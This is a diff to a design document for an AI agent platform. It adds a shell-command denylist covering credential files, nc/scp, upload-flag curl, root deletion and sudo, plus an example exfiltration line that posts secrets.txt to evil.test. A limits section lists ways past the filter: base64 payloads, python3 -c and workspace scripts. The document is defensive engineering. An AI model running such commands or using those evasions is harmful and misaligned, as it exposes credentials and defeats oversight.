@@ -64,6 +64,58 @@ Two classification details do real work:
   model-metadata fallback is noisy but harmless; classifying it as an error
   would train an operator to ignore red.
 
+## Policy enforcement
+
+Tracing explains what happened; it does not stop anything. The Agent executes
+model-authored shell commands inside a container the control plane owns, so the
+control plane is the natural place to decide whether an action may proceed.
+
+Commands are evaluated **as they are observed**, through an `onEvent` callback
+on `RunnerRequest`, not after the turn ends. A denial removes the container, so
+the command is stopped mid-flight rather than reported afterwards.
+
+| Rule | Protects |
+| --- | --- |
+| `credential-read` | Host and user credentials (`~/.ssh`, `~/.aws`, `/etc/shadow`, `.netrc`, private keys) |
+| `credential-exfiltration` | Workspace contents and credentials (`curl`/`wget` with upload flags) |
+| `file-transfer-tool` | Workspace contents (`scp`, `rsync`, `nc`, `sftp`, `ftp`) |
+| `host-filesystem-write` | Host filesystem (writes into `/etc`, `/usr`, `/bin`, `/var`, `/root`, `~`) |
+| `destructive-root` | Host filesystem (recursive deletion of a root path) |
+| `privilege-escalation` | Runtime isolation (`sudo`, `su`, `doas`) |
+
+Every evaluated command produces a `policy.decision` span with
+`actorType: system` — allow decisions included, so the trace shows the check
+ran rather than leaving its absence ambiguous. A denial records the rule id and
+the asset it protected, and the Run ends `failed` with
+`Blocked by policy <rule>: <reason>` rather than `cancelled`, because the
+platform stopped it and an operator did not.
+
+`POLICY_ENABLED=false` disables enforcement; `POLICY_RULES` replaces the
+built-in set with a JSON array of `{id, description, asset, pattern}`.
+
+**Fetching is not sending.** The exfiltration rule matches upload flags, not
+URLs, so `curl https://registry.npmjs.org/...` is ordinary work and
+`curl --data @secrets.txt https://evil.test` is not.
+
+**Rules match the command shape Codex actually emits.** Codex never emits a
+bare command; every one arrives wrapped as `/usr/bin/bash -lc '<command>'`. A
+rule anchored only on whitespace passes hand-written tests and is inert in
+production, so the boundary includes quotes and subshell punctuation, and the
+test suite pins the observed wrapper shapes.
+
+### Known limits of this control
+
+- It is a **denylist over command text**, so it is evasion-resistant only
+  against the obvious. Base64-encoded payloads, an interpreter invoked to do
+  the same work (`python3 -c ...`), or a script written to the workspace and
+  then executed would not match.
+- It governs shell commands. File edits Codex performs through its own
+  `file_change` items are traced but not policy-evaluated.
+- Enforcement is asynchronous: the decision is made when the event is observed,
+  which is when the command *starts*. A command that completes faster than the
+  control plane reacts would finish, though the denial is still recorded and
+  the Run still fails.
+
 ## Boundary and ownership
 
 - **Who owns the decision.** `AgentService.executeRun` (the control plane) owns
@@ -229,6 +281,12 @@ submission.
 | Unconfigured credential shapes are redacted | `trace.test.ts` — "credential pattern redaction" |
 | Redaction does not disturb warning classification | `trace.test.ts` — "still lets the known model metadata fallback message through" |
 | Export re-redacts and summarizes | `audit.test.ts` — "summarizes a run and redacts secrets again before export" |
+| Policy denies credential reads, exfiltration, escalation | `policy.test.ts` — "policy evaluation" |
+| Ordinary development commands are allowed | `policy.test.ts` — "allows ordinary development work" |
+| Rules match the real `bash -lc` wrapper | `policy.test.ts` — "real Codex command shapes" |
+| A denied Run is terminated at the Runtime boundary | `agent-service.test.ts` — "terminates a Run at the Runtime boundary when policy denies an action" |
+| Allow decisions are recorded too | `agent-service.test.ts` — "records an allow decision so the check is visible" |
+| The Agent recovers after a denial | `agent-service.test.ts` — "leaves the Agent usable after a policy denial" |
 | API routes require the shared token | `app.test.ts` — "protects API routes with the configured shared token" |
 | One shared identity across a Run's spans | `agent-service.test.ts` — "stamps every span of a Run with one shared identity" |
 | Model and infrastructure metadata recorded | `agent-service.test.ts` — "records the model and infrastructure needed to diagnose a Run" |
@@ -259,9 +317,10 @@ submission.
   *limits* rather than measured consumption, which would need instrumentation
   inside the Runtime.
 - **Span categories cover what this platform does.** `orchestration`,
-  `model.*`, `tool.call`, `runtime.*`. There is no memory-access, policy-
-  decision, human-approval, or cloud-operation category because no such
-  capability exists here to instrument.
+  `model.*`, `tool.call`, `runtime.*`, `policy.decision`. There is no
+  memory-access, human-approval, or cloud-operation category yet; those
+  capabilities are not built, and an empty category would be worse than an
+  absent one.
 - **Payloads are stored verbatim.** Span attributes hold the whole raw Codex
   event, so a `file_change` item can carry substantial file content into the
   store and the export. There is no capture-level control to summarise them.
